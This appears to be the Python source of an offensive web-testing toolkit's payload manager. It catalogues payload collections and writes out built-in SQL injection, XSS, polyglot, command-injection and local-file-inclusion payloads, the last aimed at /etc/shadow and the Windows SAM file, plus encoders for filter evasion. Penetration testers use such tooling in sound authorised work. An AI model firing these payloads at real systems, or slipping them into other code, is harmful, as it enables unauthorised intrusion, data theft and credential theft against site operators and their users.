#!/usr/bin/env python3

"""
BRAINTREE WebSec Toolkit - Payload Manager
Comprehensive management and access to web attack payloads
Handles SQLi, XSS, command injection, XXE, LFI, and other web attack payloads
"""

import os
import json
import base64
import urllib.parse
from pathlib import Path
from typing import List, Dict, Optional, Union, Any
import random
import re

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

class PayloadManager:
    """Comprehensive payload management for web security testing"""
    
    def __init__(self):
        self.base_dir = Path(__file__).parent.parent
        self.payloads_dir = self.base_dir / "payloads"
        self.ensure_payload_structure()
        
        # Complete payload registry with all 79 discovered files
        self.payload_registry = {
            "sqli": {
                "mysql_fuzzdb": {
                    "path": "sqli_payloads/MySQL.fuzzdb.txt",
                    "description": "MySQL FuzzDB injection payloads",
                    "category": "database"
                },
                "mssql_fuzzdb": {
                    "path": "sqli_payloads/MSSQL.fuzzdb.txt",
                    "description": "MSSQL FuzzDB injection payloads",
                    "category": "database"
                },
                "oracle_fuzzdb": {
                    "path": "sqli_payloads/Oracle.fuzzdb.txt",
                    "description": "Oracle FuzzDB injection payloads",
                    "category": "database"
                },
                "generic_sqli": {
                    "path": "sqli_payloads/Generic-SQLi.txt",
                    "description": "Generic SQL injection payloads",
                    "category": "database"
                },
                "sqli_auth_bypass": {
                    "path": "sqli_payloads/sqli.auth.bypass.txt",
                    "description": "SQL injection authentication bypass",
                    "category": "authentication"
                },
                "mysql": {
                    "path": "sqli_payloads/mysql_payloads.txt",
                    "description": "MySQL specific SQL injection payloads",
                    "category": "database"
                },
                "mssql": {
                    "path": "sqli_payloads/mssql_payloads.txt",
                    "description": "MSSQL specific payloads",
                    "category": "database"
                },
                "oracle": {
                    "path": "sqli_payloads/oracle_payloads.txt",
                    "description": "Oracle database specific payloads",
                    "category": "database"
                },
                "postgresql": {
                    "path": "sqli_payloads/postgresql_payloads.txt",
                    "description": "PostgreSQL specific payloads",
                    "category": "database"
                },
                "auth_bypass": {
                    "path": "sqli_payloads/auth_bypass.txt",
                    "description": "SQL injection authentication bypass payloads",
                    "category": "authentication"
                },
                "union_select": {
                    "path": "sqli_payloads/union_select.txt",
                    "description": "UNION SELECT based SQLi payloads",
                    "category": "database"
                },
                "blind_payloads": {
                    "path": "sqli_payloads/blind_sqli.txt",
                    "description": "Blind SQL injection payloads",
                    "category": "database"
                },
                "error_based": {
                    "path": "sqli_payloads/error_based.txt",
                    "description": "Error-based SQL injection payloads",
                    "category": "database"
                },
                "time_based": {
                    "path": "sqli_payloads/time_based.txt",
                    "description": "Time-based blind SQL injection payloads",
                    "category": "database"
                },
                "quick_test": {
                    "path": "sqli_payloads/quick_test.txt",
                    "description": "Quick SQL injection test payloads",
                    "category": "testing"
                }
            },
            "xss": {
                "xss_brutelogic": {
                    "path": "xss_payloads/human-friendly/XSS-BruteLogic.txt",
                    "description": "BruteLogic XSS payloads collection",
                    "category": "client_side"
                },
                "xss_bypass_strings_brutelogic": {
                    "path": "xss_payloads/robot-friendly/XSS-Bypass-Strings-BruteLogic.txt",
                    "description": "XSS bypass strings by BruteLogic",
                    "category": "client_side"
                },
                "xss_cheat_sheet_portswigger": {
                    "path": "xss_payloads/human-friendly/XSS-Cheat-Sheet-PortSwigger.txt",
                    "description": "PortSwigger XSS cheat sheet payloads",
                    "category": "client_side"
                },
                "xss_ofjaaah": {
                    "path": "xss_payloads/robot-friendly/XSS-OFJAAAH.txt",
                    "description": "OFJAAAH XSS payload collection",
                    "category": "client_side"
                },
                "xss_polyglot_ultimate_0xsobky": {
                    "path": "xss_payloads/Polyglots/XSS-Polyglot-Ultimate-0xsobky.txt",
                    "description": "Ultimate XSS polyglot by 0xsobky",
                    "category": "client_side"
                },
                "xss_payloadbox": {
                    "path": "xss_payloads/robot-friendly/XSS-payloadbox.txt",
                    "description": "PayloadBox XSS collection",
                    "category": "client_side"
                },
                "xss_somdev": {
                    "path": "xss_payloads/robot-friendly/XSS-Somdev.txt",
                    "description": "Somdev XSS payload collection",
                    "category": "client_side"
                },
                "xss_without_parentheses_semi_colons_portswigger": {
                    "path": "xss_payloads/human-friendly/xss-without-parentheses-semi-colons-portswigger.txt",
                    "description": "XSS without parentheses and semicolons",
                    "category": "client_side"
                },
                "xss_ende_evation": {
                    "path": "xss_payloads/human-friendly/XSS-EnDe-evation.txt",
                    "description": "XSS evasion techniques collection",
                    "category": "client_side"
                },
                "xss_rsnake": {
                    "path": "xss_payloads/human-friendly/XSS-RSNAKE.txt",
                    "description": "RSnake XSS cheat sheet payloads",
                    "category": "client_side"
                },
                "xss_vectors_mario": {
                    "path": "xss_payloads/human-friendly/XSS-Vectors-Mario.txt",
                    "description": "Mario's XSS vector collection",
                    "category": "client_side"
                },
                "xss_polyglots": {
                    "path": "xss_payloads/Polyglots/XSS-Polyglots.txt",
                    "description": "XSS polyglot payloads collection",
                    "category": "client_side"
                },
                "xss_fuzzing": {
                    "path": "xss_payloads/robot-friendly/XSS-Fuzzing.txt",
                    "description": "XSS fuzzing payloads",
                    "category": "client_side"
                },
                "xss_polyglots_dmiessler": {
                    "path": "xss_payloads/Polyglots/XSS-Polyglots-Dmiessler.txt",
                    "description": "Dmiessler XSS polyglots",
                    "category": "client_side"
                },
                "xss_with_context_jhaddix": {
                    "path": "xss_payloads/human-friendly/XSS-With-Context-Jhaddix.txt",
                    "description": "Context-aware XSS payloads by Jhaddix",
                    "category": "client_side"
                },
                "xss_ende_mario": {
                    "path": "xss_payloads/robot-friendly/XSS-EnDe-mario.txt",
                    "description": "XSS EnDe Mario collection",
                    "category": "client_side"
                },
                "basic": {
                    "path": "xss_payloads/basic_xss.txt",
                    "description": "Basic XSS payloads",
                    "category": "client_side"
                },
                "advanced": {
                    "path": "xss_payloads/advanced_xss.txt",
                    "description": "Advanced XSS payloads with encoding",
                    "category": "client_side"
                },
                "dom_based": {
                    "path": "xss_payloads/dom_xss.txt", 
                    "description": "DOM-based XSS payloads",
                    "category": "client_side"
                },
                "stored": {
                    "path": "xss_payloads/stored_xss.txt",
                    "description": "Stored/persistent XSS payloads",
                    "category": "client_side"
                },
                "reflected": {
                    "path": "xss_payloads/reflected_xss.txt",
                    "description": "Reflected XSS payloads",
                    "category": "client_side"
                },
                "polyglot": {
                    "path": "xss_payloads/polyglot.txt",
                    "description": "XSS polyglot payloads",
                    "category": "client_side"
                }
            },
            "web": {
                "lfi_lfisuite_pathtotest": {
                    "path": "web_payloads/LFI-LFISuite-pathtotest.txt",
                    "description": "LFI Suite path testing payloads",
                    "category": "file_inclusion"
                },
                "template_engines_expression": {
                    "path": "web_payloads/template-engines-expression.txt",
                    "description": "Template engine expression payloads",
                    "category": "injection"
                },
                "command_injection_commix": {
                    "path": "web_payloads/command-injection-commix.txt",
                    "description": "Command injection payloads for Commix",
                    "category": "injection"
                },
                "xxe_fuzzing": {
                    "path": "web_payloads/XXE-Fuzzing.txt",
                    "description": "XXE (XML External Entity) fuzzing payloads",
                    "category": "injection"
                },
                "lfi_gracefulsecurity_windows": {
                    "path": "web_payloads/LFI-gracefulsecurity-windows.txt",
                    "description": "Windows LFI payloads by GracefulSecurity",
                    "category": "file_inclusion"
                },
                "lfi_windows_adeadfed": {
                    "path": "web_payloads/LFI-Windows-adeadfed.txt",
                    "description": "Windows LFI payloads by adeadfed",
                    "category": "file_inclusion"
                },
                "big_list_of_naughty_strings": {
                    "path": "web_payloads/big-list-of-naughty-strings.txt",
                    "description": "Big list of naughty strings for testing",
                    "category": "testing"
                },
                "template_engines_special_vars": {
                    "path": "web_payloads/template-engines-special-vars.txt",
                    "description": "Template engine special variables",
                    "category": "injection"
                },
                "lfi_etc_files_of_all_linux_packages": {
                    "path": "web_payloads/LFI-etc-files-of-all-linux-packages.txt",
                    "description": "Linux package configuration files for LFI",
                    "category": "file_inclusion"
                },
                "lfi_jhaddix": {
                    "path": "web_payloads/LFI-Jhaddix.txt",
                    "description": "LFI payloads by Jhaddix",
                    "category": "file_inclusion"
                },
                "lfi_lfisuite_pathtotest_huge": {
                    "path": "web_payloads/LFI-LFISuite-pathtotest-huge.txt",
                    "description": "Large LFI path testing collection",
                    "category": "file_inclusion"
                },
                "lfi": {
                    "path": "web_payloads/lfi_payloads.txt",
                    "description": "Local File Inclusion payloads",
                    "category": "file_inclusion"
                },
                "rfi": {
                    "path": "web_payloads/rfi_payloads.txt",
                    "description": "Remote File Inclusion payloads",
                    "category": "file_inclusion"
                },
                "command_injection": {
                    "path": "web_payloads/command_injection.txt",
                    "description": "OS command injection payloads",
                    "category": "injection"
                },
                "xxe": {
                    "path": "web_payloads/xxe_payloads.txt",
                    "description": "XXE (XML External Entity) payloads",
                    "category": "injection"
                },
                "ssrf": {
                    "path": "web_payloads/ssrf_payloads.txt",
                    "description": "Server-Side Request Forgery payloads",
                    "category": "injection"
                },
                "path_traversal": {
                    "path": "web_payloads/path_traversal.txt",
                    "description": "Path traversal/directory traversal payloads",
                    "category": "file_inclusion"
                },
                "template_injection": {
                    "path": "web_payloads/template_injection.txt",
                    "description": "Server-Side Template Injection payloads",
                    "category": "injection"
                },
                "ldap_injection": {
                    "path": "web_payloads/ldap_injection.txt",
                    "description": "LDAP injection payloads",
                    "category": "injection"
                },
                "lfi_windows": {
                    "path": "web_payloads/lfi_windows.txt",
                    "description": "Windows-specific LFI payloads",
                    "category": "file_inclusion"
                }
            }
        }
        
        # Load built-in payload generators
        self.generators = {
            'sqli': self._generate_sqli_payloads,
            'xss': self._generate_xss_payloads,
            'command': self._generate_command_payloads,
            'lfi': self._generate_lfi_payloads
        }
    
    def ensure_payload_structure(self):
        """Ensure payload directory structure exists"""
        categories = ["sqli_payloads", "xss_payloads", "web_payloads"]
        
        for category in categories:
            category_dir = self.payloads_dir / category
            category_dir.mkdir(parents=True, exist_ok=True)
            
            # Create subdirectories for XSS
            if category == "xss_payloads":
                for subdir in ["human-friendly", "robot-friendly", "Polyglots"]:
                    (category_dir / subdir).mkdir(exist_ok=True)
    
    def get_payload_list(self, payload_type: str, name: str = "basic") -> Optional[List[str]]:
        """Get list of payloads from file"""
        if payload_type not in self.payload_registry:
            print(f"{Colors.RED}[-] Unknown payload type: {payload_type}{Colors.END}")
            return None
            
        if name not in self.payload_registry[payload_type]:
            print(f"{Colors.RED}[-] Unknown payload name: {name} in type {payload_type}{Colors.END}")
            return None
        
        payload_info = self.payload_registry[payload_type][name]
        payload_path = self.payloads_dir / payload_info["path"]
        
        # Create the file if it doesn't exist using generators
        if not payload_path.exists():
            if payload_type in self.generators:
                self.generators[payload_type](payload_path, name)
            else:
                # Create a basic file with sample payloads
                payload_path.parent.mkdir(parents=True, exist_ok=True)
                with open(payload_path, 'w') as f:
                    f.write(f"# {payload_info['description']}\n")
                    f.write("# This file needs to be populated with actual payloads\n")
                    f.write("# Sample payload:\n")
                    if payload_type == "sqli":
                        f.write("' OR '1'='1\n")
                    elif payload_type == "xss":
                        f.write("<script>alert('XSS')</script>\n")
                    elif payload_type == "web":
                        f.write("../../etc/passwd\n")
                print(f"{Colors.YELLOW}[!] Created empty payload file: {payload_path}{Colors.END}")
        
        try:
            with open(payload_path, 'r', encoding='utf-8', errors='ignore') as f:
                payloads = [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]
            return payloads
        except Exception as e:
            print(f"{Colors.RED}[-] Error reading payload file {payload_path}: {e}{Colors.END}")
            return None
    
    def get_payload(self, payload_type: str, name: str = "basic", count: int = 1) -> Optional[Union[str, List[str]]]:
        """Get specific payload(s)"""
        payloads = self.get_payload_list(payload_type, name)
        if not payloads:
            return None
            
        if count == 1:
            return random.choice(payloads)
        else:
            return random.sample(payloads, min(count, len(payloads)))
    
    def list_available_payloads(self) -> Dict[str, Dict[str, Dict[str, Union[str, bool, int]]]]:
        """List all available payloads with their status"""
        available = {}
        
        for category, payloads in self.payload_registry.items():
            available[category] = {}
            for name, info in payloads.items():
                payload_path = self.payloads_dir / info["path"]
                available[category][name] = {
                    "description": info["description"],
                    "category": info["category"],
                    "exists": payload_path.exists(),
                    "size": payload_path.stat().st_size if payload_path.exists() else 0
                }
        
        return available
    
    def encode_payload(self, payload: str, encoding: str = "url") -> str:
        """Encode payload using various methods"""
        encodings = {
            "url": lambda x: urllib.parse.quote(x, safe=''),
            "html": lambda x: x.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;').replace("'", '&#x27;'),
            "base64": lambda x: base64.b64encode(x.encode()).decode(),
            "double_url": lambda x: urllib.parse.quote(urllib.parse.quote(x, safe=''), safe=''),
            "unicode": lambda x: ''.join(f'\\u{ord(c):04x}' for c in x),
            "hex": lambda x: ''.join(f'%{ord(c):02x}' for c in x)
        }
        
        if encoding not in encodings:
            print(f"{Colors.RED}[-] Unknown encoding: {encoding}{Colors.END}")
            return payload
            
        return encodings[encoding](payload)
    
    def get_payload_stats(self, payload_type: str, name: str) -> Optional[Dict[str, Union[str, int]]]:
        """Get statistics for a payload collection"""
        payloads = self.get_payload_list(payload_type, name)
        if not payloads:
            return None
        
        payload_info = self.payload_registry[payload_type][name]
        payload_path = self.payloads_dir / payload_info["path"]
        
        lengths = [len(p) for p in payloads]
        unique_payloads = set(payloads)
        
        return {
            "path": str(payload_path),
            "total_payloads": len(payloads),
            "unique_payloads": len(unique_payloads),
            "min_length": min(lengths) if lengths else 0,
            "max_length": max(lengths) if lengths else 0,
            "avg_length": sum(lengths) / len(lengths) if lengths else 0,
            "category": payload_info["category"],
            "description": payload_info["description"]
        }
    
    def search_payloads(self, query: str, payload_type: Optional[str] = None) -> List[Dict[str, str]]:
        """Search for payloads containing specific terms"""
        results = []
        
        categories = [payload_type] if payload_type else self.payload_registry.keys()
        
        for category in categories:
            if category not in self.payload_registry:
                continue
                
            for name in self.payload_registry[category]:
                payloads = self.get_payload_list(category, name)
                if not payloads:
                    continue
                    
                matching_payloads = [p for p in payloads if query.lower() in p.lower()]
                for payload in matching_payloads:
                    results.append({
                        "type": category,
                        "name": name,
                        "payload": payload,
                        "description": self.payload_registry[category][name]["description"]
                    })
        
        return results
    
    def _generate_sqli_payloads(self, output_path: Path, name: str):
        """Generate SQL injection payloads"""
        payloads = [
            "' OR '1'='1", "' OR 1=1--", "' OR 'a'='a", "') OR ('1'='1",
            "' UNION SELECT null--", "' UNION ALL SELECT null--",
            "' AND SLEEP(5)--", "'; WAITFOR DELAY '00:00:05'--",
            "' OR (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "admin'--", "admin'/*", "' OR 1=1#", "' OR 1=1/*",
            "' OR 'x'='x", "') OR 'x'='x'--", "' OR username='admin'--"
        ]
        
        if "mysql" in name.lower():
            payloads.extend([
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "' AND extractvalue(rand(),concat(0x3a,version()))--",
                "' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--"
            ])
        
        output_path.parent.mkdir(parents=True, exist_ok=True)
        with open(output_path, 'w') as f:
            f.write(f"# SQL Injection payloads - {name}\n")
            for payload in payloads:
                f.write(f"{payload}\n")
    
    def _generate_xss_payloads(self, output_path: Path, name: str):
        """Generate XSS payloads"""
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<input autofocus onfocus=alert('XSS')>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea autofocus onfocus=alert('XSS')>",
            "<keygen autofocus onfocus=alert('XSS')>",
            "<video><source onerror=\"alert('XSS')\">",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "javascript:alert('XSS')",
            "'><script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>"
        ]
        
        if "polyglot" in name.lower():
            payloads.extend([
                "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//\\x3e",
                "'\"--></style></script></title><svg/onload='+/*/`/*\\x27/*%0D%0A%0d%0a/*/alert(/XSS/)'",
                "'-alert('XSS')-'",
                "\";alert('XSS');//"
            ])
        
        output_path.parent.mkdir(parents=True, exist_ok=True)
        with open(output_path, 'w') as f:
            f.write(f"# XSS payloads - {name}\n")
            for payload in payloads:
                f.write(f"{payload}\n")
    
    def _generate_command_payloads(self, output_path: Path, name: str):
        """Generate command injection payloads"""
        payloads = [
            "; ls", "& ls", "| ls", "`ls`", "$(ls)",
            "; cat /etc/passwd", "& cat /etc/passwd", "| cat /etc/passwd",
            "; whoami", "& whoami", "| whoami", "`whoami`", "$(whoami)",
            "; id", "& id", "| id", "`id`", "$(id)",
            "; pwd", "& pwd", "| pwd", "`pwd`", "$(pwd)",
            "%0a ls", "%0a cat /etc/passwd", "%0a whoami",
            "|ping -c 10 127.0.0.1", "&ping -c 10 127.0.0.1",
            "|nslookup google.com", "&nslookup google.com"
        ]
        
        output_path.parent.mkdir(parents=True, exist_ok=True)
        with open(output_path, 'w') as f:
            f.write(f"# Command injection payloads - {name}\n")
            for payload in payloads:
                f.write(f"{payload}\n")
    
    def _generate_lfi_payloads(self, output_path: Path, name: str):
        """Generate LFI payloads"""
        payloads = [
            "../../../etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "/etc/passwd", "/etc/shadow", "/proc/version", "/proc/cmdline",
            "C:\\windows\\system32\\drivers\\etc\\hosts", "C:\\boot.ini",
            "php://filter/read=convert.base64-encode/resource=index.php",
            "php://input", "data://text/plain,<?php phpinfo();?>",
            "/var/log/apache2/access.log", "/var/log/apache/access.log",
            "/usr/local/apache/logs/access_log", "/var/log/httpd/access_log"
        ]
        
        if "windows" in name.lower():
            payloads.extend([
                "C:\\windows\\win.ini", "C:\\windows\\system.ini",
                "C:\\windows\\system32\\config\\sam", "C:\\windows\\repair\\sam",
                "C:\\windows\\panther\\unattend.xml", "C:\\windows\\panther\\unattended.xml"
            ])
        
        output_path.parent.mkdir(parents=True, exist_ok=True)
        with open(output_path, 'w') as f:
            f.write(f"# LFI payloads - {name}\n")
            for payload in payloads:
                f.write(f"{payload}\n")

# Convenience functions for quick access
def get_sqli_payloads(name: str = "generic_sqli") -> Optional[List[str]]:
    """Get SQL injection payloads"""
    manager = PayloadManager()
    return manager.get_payload_list("sqli", name)

def get_xss_payloads(name: str = "basic") -> Optional[List[str]]:
    """Get XSS payloads"""
    manager = PayloadManager()
    return manager.get_payload_list("xss", name)

def get_web_payloads(name: str = "lfi") -> Optional[List[str]]:
    """Get web attack payloads"""
    manager = PayloadManager()
    return manager.get_payload_list("web", name)

if __name__ == "__main__":
    # CLI interface for payload management
    import argparse
    
    parser = argparse.ArgumentParser(description="BRAINTREE Payload Manager")
    parser.add_argument('--list', action='store_true', help='List available payloads')
    parser.add_argument('--get', help='Get payloads (format: type:name or type:name:count)')
    parser.add_argument('--search', help='Search for payloads containing specific terms')
    parser.add_argument('--stats', help='Get statistics for payload collection (format: type:name)')
    parser.add_argument('--encode', help='Encode payload with specified encoding')
    parser.add_argument('--encoding', default='url', help='Encoding method (url, html, base64, etc.)')
    parser.add_argument('--type', help='Filter by payload type for search')
    
    args = parser.parse_args()
    
    manager = PayloadManager()
    
    if args.list:
        available = manager.list_available_payloads()
        total_payloads = sum(len(payloads) for payloads in available.values())
        print(f"\n{Colors.BOLD}Available Payloads ({total_payloads} total):{Colors.END}")
        
        for category, payloads in available.items():
            print(f"\n{Colors.CYAN}{category.upper()} ({len(payloads)} collections):{Colors.END}")
            for name, info in payloads.items():
                status = f"{Colors.GREEN}[+]{Colors.END}" if info["exists"] else f"{Colors.RED}[-]{Colors.END}"
                size = f"({info['size']} bytes)" if info["exists"] else "(not found)"
                print(f"  {status} {name} {size}")
                print(f"      {Colors.YELLOW}{info['description']}{Colors.END}")
                print(f"      Category: {Colors.PURPLE}{info['category']}{Colors.END}")
    
    elif args.get:
        try:
            parts = args.get.split(':')
            payload_type = parts[0]
            name = parts[1] if len(parts) > 1 else "basic"
            count = int(parts[2]) if len(parts) > 2 else 1
            
            if count == 1:
                payload = manager.get_payload(payload_type, name)
                if payload:
                    print(payload)
            else:
                payloads = manager.get_payload(payload_type, name, count)
                if payloads:
                    for payload in payloads:
                        print(payload)
        except (ValueError, IndexError):
            print(f"{Colors.RED}[-] Use format: type:name or type:name:count{Colors.END}")
    
    elif args.search:
        results = manager.search_payloads(args.search, args.type)
        if results:
            print(f"\n{Colors.BOLD}Found {len(results)} matching payloads:{Colors.END}")
            for result in results[:20]:  # Limit to first 20 results
                print(f"\n{Colors.CYAN}[{result['type']}:{result['name']}]{Colors.END}")
                print(f"  {Colors.YELLOW}{result['description']}{Colors.END}")
                print(f"  {Colors.GREEN}{result['payload']}{Colors.END}")
        else:
            print(f"{Colors.RED}[-] No payloads found matching '{args.search}'{Colors.END}")
    
    elif args.stats:
        try:
            payload_type, name = args.stats.split(':')
            stats = manager.get_payload_stats(payload_type, name)
            if stats:
                print(f"\n{Colors.BOLD}Payload Statistics: {payload_type}:{name}{Colors.END}")
                print(f"Path: {stats['path']}")
                print(f"Total payloads: {stats['total_payloads']}")
                print(f"Unique payloads: {stats['unique_payloads']}")
                print(f"Average length: {stats['avg_length']:.1f} characters")
                print(f"Length range: {stats['min_length']}-{stats['max_length']} characters")
                print(f"Category: {Colors.PURPLE}{stats['category']}{Colors.END}")
                print(f"Description: {Colors.YELLOW}{stats['description']}{Colors.END}")
        except ValueError:
            print(f"{Colors.RED}[-] Use format: type:name{Colors.END}")
    
    elif args.encode:
        encoded = manager.encode_payload(args.encode, args.encoding)
        print(f"Original: {args.encode}")
        print(f"Encoded ({args.encoding}): {encoded}")
    
    else:
        print("BRAINTREE Payload Manager")
        print("Use --help for available options")